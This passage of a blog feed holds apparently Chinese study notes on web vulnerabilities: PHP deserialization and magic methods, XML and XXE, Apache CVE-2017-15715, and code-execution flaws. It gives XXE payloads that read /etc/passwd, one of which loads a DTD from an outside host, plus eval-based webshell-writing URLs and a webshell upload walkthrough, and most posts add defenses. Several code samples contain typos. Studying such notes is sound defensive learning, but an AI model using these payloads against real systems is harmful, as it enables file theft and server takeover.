，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组(该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化)</td></tr><tr><td align="center">__sleep()</td><td align="center">使用serialize时触发 ，在对象被序列化前自动调用，该函数需要返回以类成员变量名作为元素的数组(该数组里的元素会影响类成员变量是否被序列化。只有出现在该数组元素里的类成员变量才会被序列化)</td></tr><tr><td align="center">__destruct()</td><td align="center">对象被销毁时触发</td></tr><tr><td align="center">__call()</td><td align="center">在对象中调用不可访问的方法时触发，即当调用对象中不存在的方法会自动调用该方法</td></tr><tr><td align="center">__callStatic()</td><td align="center">在静态上下文中调用不可访问的方法时触发</td></tr><tr><td align="center">__get()</td><td align="center">读取不可访问的属性的值时会被调用（不可访问包括私有属性，或者没有初始化的属性）</td></tr><tr><td align="center">__set()</td><td align="center">在给不可访问属性赋值时，即在调用私有属性的时候会自动执行</td></tr><tr><td align="center">__isset()</td><td align="center">当对不可访问属性调用isset()或empty()时触发</td></tr><tr><td align="center">__unset()</td><td align="center">当对不可访问属性调用unset()时触发</td></tr><tr><td align="center">__invoke()</td><td align="center">当脚本尝试将对象调用为函数时触发</td></tr></tbody></table><blockquote><p>具体描述可见<a href="https://www.php.net/manual/zh/language.oop5.magic.php">PHP手册</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">animal</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span> = <span class="string">&#x27;wuyifan&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name . <span class="string">&quot; is wuqian...\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;<span class="comment">//construct,destruct,toString类似</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;调用了__wakeup()方法&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;调用了__set()方法\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;hr&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;调用了__get()方法\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$jl</span> = <span class="keyword">new</span> animal();<span class="comment">#调用了__construct()方法  创建对象的时候用</span></span><br><span class="line"><span class="variable">$jl</span>-&gt;name = <span class="number">1</span>;<span class="comment">#调用了__set()方法私有属性赋值</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$jl</span>-&gt;name;<span class="comment">#调用了__get()方法私有属性赋值</span></span><br><span class="line"><span class="variable">$esr_jl</span> = serialize(<span class="variable">$jl</span>);</span><br><span class="line"><span class="comment">//print_r($ser_jl);</span></span><br><span class="line">print_r(userialize(<span class="variable">$ser_jl</span>));<span class="comment">#调用了__wakeup()方法，使用反序列化函数时调用</span></span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">#调用了__destruct()方法 结束程序调用</span></span><br></pre></td></tr></table></figure><p><strong>序列化和反序列化</strong></p><p>为了有效地储存或传递数据，同时不丢失其类型和结构，经常需要利用序列化和反序列化函数对数据进行处理</p><p>序列化函数返回字符串，此字符串包含了表达值的字节流，可以储存在任何地方</p><p>反序列化函数对单一的已序列化的变量进行操作，将其转换为原来的值</p><p>这两个过程结合起来可以轻松的储存和传输数据，使程序更具维护性</p><p><strong>序列化</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$team</span> = <span class="string">&#x27;sl&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$steam_name</span> = <span class="string">&#x27;star&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$steam_group</span> = <span class="string">&#x27;gogo&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">star</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;<span class="variable">$team_member</span> = <span class="string">&#x27;fight&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$test</span> = <span class="keyword">new</span> test();</span><br><span class="line"><span class="keyword">echo</span> serialize(<span class="variable">$test</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>序列化的结果为：</p><p>对象类型:对象长度:对象名称:类中变量个数:{变量类型:长度:“名称”;类型:长度:””值”;···}</p><p>0:4:test:3:{s:4:”team”;s:2:”sl”;···}</p><blockquote><p>当变量收到不同修饰符修饰进行序列化后，序列化后的变量的长度和名称都会发生变化</p><p>public 变量$steam的长度为4，正常输出</p><p>private 会在变量$team_name前加上类的名称，并且长度会比正常的多两个字节</p><p>protected 会在变量$team_group前边加上*，并且长度会多三个字节</p></blockquote><p>序列化格式中的字母含义：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a - arrayb - booleano  - common objects - stringr - referenceR - pointer reference</span><br><span class="line">d - doublei - <span class="built_in">integer</span>C  - custom objectN - null0 - classU -unicode string</span><br></pre></td></tr></table></figure><p><strong>反序列化</strong></p><p>定义一个字符出，然后用个反序列化函数unserialize进行反序列化处理，然后输出</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$ser</span> = <span class="string">&#x27;0:4:test:3&#123;s:4:&quot;team&quot;;s:2:&quot;sl&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$ser</span> = userialize(<span class="variable">$ser</span>);</span><br><span class="line">var_dump(<span class="variable">$ser</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>php反序列化漏洞</strong></p><p>在反序列化过程中，其功能类似于复原了一个对象，并赋予其相应的得属性值，如果让攻击者操纵任意反序列数据，那么攻击者就可以实现任意类对象的创建，如果一些类存在自动触发得方法(魔术函数)，就有可能以此为跳板而进攻系统应用。</p><blockquote><p>漏洞成因：</p><ol><li>uniserialize()函数可控</li><li>存在魔法函数</li></ol></blockquote><p>示例一：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="variable">$test</span> = <span class="string">&quot;demo&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            @<span class="keyword">eval</span>(<span class="variable">$thiss</span>-&gt;test);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$test</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;tset&#x27;</span>];</span><br><span class="line"><span class="variable">$Len</span> = strlen(<span class="variable">$test</span>)+<span class="number">1</span>;</span><br><span class="line"><span class="variable">$p</span> = <span class="string">&quot;0:1:\&quot;A\&quot;:&#123;s:4:\&quot;test\&quot;;s:&quot;</span>.<span class="variable">$len</span>.<span class="string">&quot;:\&quot;&quot;</span>.<span class="variable">$test</span>.<span class="string">&quot;;\&quot;;&#125;&quot;</span>; <span class="comment">//构造序列化对象</span></span><br><span class="line"><span class="variable">$test_usner</span> = unserialize(<span class="variable">$p</span>); <span class="comment">//反序列化同时触发__destruct函数</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>如上代码，通过调用<code>__destruct()</code>这个析构函数，将恶意的payload注入，导致代码执行。根据上述魔术方法，当程序跑到unserialize()反序列化的时候，会触发<code>__destruct()</code>方法，同时也可以触发<code>__wakeup()</code>方法。但是如果想恶意注入payload，还需要对$test的值进行覆盖。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;PHP的类和对象&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class</summary>
      
    
    
    
    <category term="漏洞总结" scheme="https://sinevil.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="注入类漏洞" scheme="https://sinevil.github.io/tags/%E6%B3%A8%E5%85%A5%E7%B1%BB%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>XML</title>
    <link href="https://sinevil.github.io/2021/07/26/XML/"/>
    <id>https://sinevil.github.io/2021/07/26/XML/</id>
    <published>2021-07-26T08:33:08.000Z</published>
    <updated>2021-08-13T02:50:50.028Z</updated>
    
    <content type="html"><![CDATA[<p><strong>XML</strong></p><ul><li>什么是XML</li></ul><p>XML是一种可扩展标记语言 ，用来结构化、储存以及传输信息</p><ul><li>XML的组成</li></ul><p>XML由3个部分构成，它们分别是：XML声明，文档类型定义，文档元素</p><ul><li>XML实例</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--XML声明(定义了XML的版本和编码)--&gt;</span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;  </span><br><span class="line">&lt;!--文档类型定义--&gt;(DTD)</span><br><span class="line">&lt;!DOCYTPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)</span><br><span class="line">  &lt;!ELEMRNT to (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">  &lt;!ELEMRNT from (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">  &lt;!ELEMRNT heading (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">  &lt;!ELEMRNT body (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">]&gt;  </span><br><span class="line">&lt;!--文档元素--&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;George&lt;/to&gt;</span><br><span class="line">&lt;from&gt;John&lt;/from&gt;    </span><br><span class="line">&lt;heading&gt;Reminder&lt;/heading&gt;</span><br><span class="line">&lt;body&gt;Don<span class="string">&#x27;t forget the meeting&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/note&gt;</span></span><br></pre></td></tr></table></figure><ul><li>XML声明</li></ul><p>XML声明以<?开头，以?>结尾。version属性是必选的，他定义了XML的版本，encoding的属性是可选的。定义了XML进行解码所用的字符集</p><ul><li>文档类型定义</li></ul><p> 文档类型定义是用来约束一个XML文档的书写规范</p><ol><li>文档类型定义的基础语法</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><ol start="2"><li> 对文档类型定义直接放在XML文档中，称为内部定义。</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCYTPE note [  <span class="comment">#定义此文档的类型</span></span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)  <span class="comment">#定义note的四个元素</span></span><br><span class="line">  &lt;!ELEMRNT to (<span class="comment">#PCDATA)&gt;  #定义元素类型</span></span><br><span class="line">  &lt;!ELEMRNT from (<span class="comment">#PCDATA)&gt;  </span></span><br><span class="line">  &lt;!ELEMRNT heading (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">  &lt;!ELEMRNT body (<span class="comment">#PCDATA)&gt;</span></span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><ol start="3"><li>外部文档引用</li></ol><p>文档类型定义的内容也可以单独保存为单独的DTD文档</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#DTD引用本地文档</span></span><br><span class="line">&lt;!DOCTYPE 根元素 SYSTEM “文件名“&gt;</span><br><span class="line"><span class="comment">#DTD引用公共网络上的DTD</span></span><br><span class="line">&lt;!DOCTYPE 根元素 PUBLIC <span class="string">&quot;DTD名称&quot;</span> <span class="string">&quot;DTD文档的URL&quot;</span>&gt;</span><br></pre></td></tr></table></figure><blockquote><p>DTD(文档类型定义)的作用是定义XML文档的合法构建模块，DTD可以在内部声明，也可以外部声明</p><p>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;XML&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;什么是XML&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;XML是一种可扩展标记语言 ，用来结构化、储存以及传输信息&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;XML的组成&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;XML由3个部分构成，它们分别是：X</summary>
      
    
    
    
    <category term="基础语言" scheme="https://sinevil.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="XML" scheme="https://sinevil.github.io/tags/XML/"/>
    
  </entry>
  
  <entry>
    <title>XXE</title>
    <link href="https://sinevil.github.io/2021/07/26/XXE/"/>
    <id>https://sinevil.github.io/2021/07/26/XXE/</id>
    <published>2021-07-26T08:23:26.000Z</published>
    <updated>2021-08-03T08:07:22.239Z</updated>
    
    <content type="html"><![CDATA[<h2> XXE漏洞 </h2><p><strong>什么是XEE</strong></p><p>XEE也称为XML外部实体注入漏洞，该漏洞发生在 应用程序解析XML输入时，没有禁止外部实体的加载。通过XML实体的SYSTEM关键词导致XML解析器可以从本地文件或者远程URI中获取数据。</p><p><strong>危害</strong></p><p>当XML引用外部实体时，通过构造的恶意内容，可导致读取任意文件，执行系统命令，探测内网端口，攻击内网网站等危害</p><p><strong>构造实体注入</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#直接通过DTD外部实体声明</span></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">  &lt;!ENTITY b SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;name&gt;&amp;b;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"><span class="comment">#通过DTD文档引入外部DTD文档，再引入外部实体声明</span></span><br><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>&gt;</span><br><span class="line">&lt;!DOCTYPE a[</span><br><span class="line">  &lt;!ENTITY d SYSTEM <span class="string">&quot;http://192.168.17.3:3378/test.dtd&quot;</span>&gt;</span><br><span class="line">    %d;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">  &lt;name&gt;&amp;b;&lt;/name&gt;</span><br><span class="line">&lt;/root&gt;</span><br><span class="line"><span class="comment">#test.dtd</span></span><br><span class="line">&lt;!ENTITY b SYSTEM <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p><strong>漏洞利用</strong></p><ul><li>判断漏洞存在的方法</li></ul><ol><li>通过注入外部实体，通过bp抓包观察程序是如何传输数据的</li><li>尝试插入外部实体，观察回显</li><li>尝试插入外部地址的外部实体，观察是否有请求</li></ol><ul><li>漏洞情景分类</li></ul><ol><li>有回显</li></ol><p>可以直接在页面中看到payload的执行结果，直接利用进行敏感文件获取，直接输出结果</p><ol start="2"><li>无回显</li></ol><p>看不到payload的执行结果，可通过外带使用外带数据通道提取数据</p><p><strong>防范方法</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">使用开发语言提供的禁用外部实体的方法</span><br><span class="line"><span class="comment">#php：</span></span><br><span class="line">xml_disable_entity_loader(<span class="literal">true</span>)</span><br><span class="line"><span class="comment">#java:</span></span><br><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newinstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>)</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h2&gt; XXE漏洞 &lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;什么是XEE&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;XEE也称为XML外部实体注入漏洞，该漏洞发生在 应用程序解析XML输入时，没有禁止外部实体的加载。通过XML实体的SYSTEM关键词导致XML解析器可以从本地文件或者远程UR</summary>
      
    
    
    
    <category term="漏洞总结" scheme="https://sinevil.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="XML漏洞" scheme="https://sinevil.github.io/tags/XML%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>Apache换行解析漏洞</title>
    <link href="https://sinevil.github.io/2021/07/25/apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/"/>
    <id>https://sinevil.github.io/2021/07/25/apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-07-25T01:29:31.000Z</published>
    <updated>2021-07-27T01:27:40.560Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Apache换行解析漏洞(CVE-2017-15715)</strong></p><ul><li>影响版本</li></ul><p>Apache httpd 2.4.0 ~ 2.4.29</p><ul><li>原理</li></ul><p>apache在修复第一个后缀名解析漏洞时，用正则表达式匹配后缀。在正则表示式中，<code>$</code>用来匹配字符串结尾位置，但如果设置了RegExp对象的Multiline属性，则$也匹配<code>\n</code>或者<code>\r</code>,</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#httpd解析php文件的表达式</span></span><br><span class="line">&lt;FilesMatch \.php$&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line"><span class="comment">#&lt;FilesMatch&gt; 中指定的表达式可以将“$”匹配到恶意文件名中的换行符，而不是仅匹配文件名的末尾。这可以在某些文件的上传被外部阻止的环境中被利用，但只能通过匹配文件名的尾随部分</span></span><br></pre></td></tr></table></figure><p>由于是黑名单匹配，所以我们的上传可以成功，并且在解析时会匹配换行符，我们访问时在php后加上%0a即可正常访问。</p><p><strong>漏洞复现</strong></p><ul><li>打开环境，可以清晰的发现是一个文件上传点，我们首先选择对其查看源码</li></ul><p><img src="/2021/07/25/apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/QQ%E6%88%AA%E5%9B%BE20210723104444.png" alt="QQ截图20210723104444"></p><ul><li>源码中并无法确认是属于什么类型的文件上传，但是文件上传只是一个站的其中一个功能，选择对这个站进行信息搜集</li></ul><p><img src="/2021/07/25/apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/QQ%E6%88%AA%E5%9B%BE20210725091747.png" alt="QQ截图20210725091747"></p><ul><li>发现其中间件有Apache，且Apache版本为2.4.10</li></ul><p><img src="/2021/07/25/apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/QQ%E6%88%AA%E5%9B%BE20210725102727.png" alt="QQ截图20210725102727"></p><ul><li>搜寻到Apache的换行解析漏洞，通过bp抓包上传一个一句话的<code>.php</code>文件并在其后缀加上换行符</li></ul><p><img src="/2021/07/25/apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/QQ%E6%88%AA%E5%9B%BE20210725092156.png" alt="QQ截图20210725092156"></p><ul><li>将其发包，通过phpinfo();函数判断其是否上传成功并获取shell</li></ul><p><img src="/2021/07/25/apache%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E/QQ%E6%88%AA%E5%9B%BE20210725092319.png" alt="QQ截图20210725092319"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;Apache换行解析漏洞(CVE-2017-15715)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;影响版本&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Apache httpd 2.4.0 ~ 2.4.29&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;原理&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;a</summary>
      
    
    
    
    <category term="漏洞总结" scheme="https://sinevil.github.io/categories/%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
    
    
    <category term="中间件漏洞" scheme="https://sinevil.github.io/tags/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>AWD攻防(持续)</title>
    <link href="https://sinevil.github.io/2021/07/23/AWD/"/>
    <id>https://sinevil.github.io/2021/07/23/AWD/</id>
    <published>2021-07-23T10:34:04.000Z</published>
    <updated>2021-07-23T11:00:33.680Z</updated>
    
    <content type="html"><![CDATA[<p><strong>第一次攻防实战</strong></p><ul><li>准备阶段，防御流程</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;第一次攻防实战&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;准备阶段，防御流程&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=</summary>
      
    
    
    
    <category term="实战" scheme="https://sinevil.github.io/categories/%E5%AE%9E%E6%88%98/"/>
    
    
    <category term="AWD攻防" scheme="https://sinevil.github.io/tags/AWD%E6%94%BB%E9%98%B2/"/>
    
  </entry>
  
  <entry>
    <title>代码执行漏洞</title>
    <link href="https://sinevil.github.io/2021/07/23/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>https://sinevil.github.io/2021/07/23/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</id>
    <published>2021-07-23T08:22:59.000Z</published>
    <updated>2021-08-08T08:56:33.139Z</updated>
    
    <content type="html"><![CDATA[<p><strong>代码执行漏洞</strong></p><ul><li>什么是代码执行漏洞</li></ul><p>当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能够控制这个字符串，将造成代码注入漏洞</p><ul><li>漏洞产生的原因</li></ul><p>应用程序本身过滤不严，用户可以通过请求将代码注入到应用中执行</p><ul><li>相关函数</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python: <span class="built_in">exec</span></span><br><span class="line">php：<span class="built_in">eval</span>,assert,preg_replace(<span class="string">&#x27;/*/e&#x27;</span>,<span class="variable">$ret</span>=<span class="string">&quot;\\1&quot;</span>;<span class="string">&#x27;,$data);（PHP版本&lt;5.5.0）</span></span><br><span class="line"><span class="string">asp：eval,exevute.executeglobal</span></span><br><span class="line"><span class="string">jsp：jsp中没有php中的eval函数，但是可以使用反射机制，使用基于反射机制的表达式引擎，如0GNL，SpEL，MVEL等</span></span><br></pre></td></tr></table></figure><ul><li>漏洞分类</li></ul><p>换行代码的漏洞：eval assert<br>callback函数：preg_replace + /e模式<br>反序列化：unserialize()</p><ul><li>漏洞危害</li></ul><p>执行任意代码</p><p>获取shell，甚至控制服务器、</p><ul><li>具体操作</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#一句话</span></span><br><span class="line">http://www.xXx.com/News/detai1/id/&#123;<span class="variable">$&#123;@eval(S_ POST[a])&#125;</span>&#125;</span><br><span class="line"><span class="comment">#获取当前路径</span></span><br><span class="line">http://www.xxx.com/News/detail/id/&#123;<span class="variable">$&#123;print(getd)))&#125;</span>&#125;</span><br><span class="line"><span class="comment">#读取文件</span></span><br><span class="line">http://www.xx.com/News/detail/id/&#123;<span class="variable">$&#123;exit(var. dump(file_ get_ contents($_ POST[&#x27;f&#x27;])))&#125;</span>&#125;    POST的数据为: f=/etc/passwd</span><br><span class="line"><span class="comment">#写shell</span></span><br><span class="line">http://www.xxx.com/News/detail/id/&#123;<span class="variable">$&#123;exit(var._dump(file_ put_ contents($_ POST[&#x27;f&#x27;],$_POST[&#x27;d&#x27;])))&#125;</span>&#125;   POST的数据为: f=1.php&amp;d=&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_</span> POST[<span class="string">&#x27;aa&#x27;</span>])?&gt;</span><br></pre></td></tr></table></figure><ul><li>防范方法</li></ul><p>严格控制eval()函数的使用</p><p>字符串使用单引号包括可控代码,插入前使用addslashes转义</p><p>放弃使用preg_ replace 的e修饰符,使用preg_ <em>replace</em> callback()替换</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;代码执行漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;什么是代码执行漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能够控制这个字符串，将造成代码注入漏洞&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;漏洞产生的原因&lt;/li&gt;</summary>
      
    
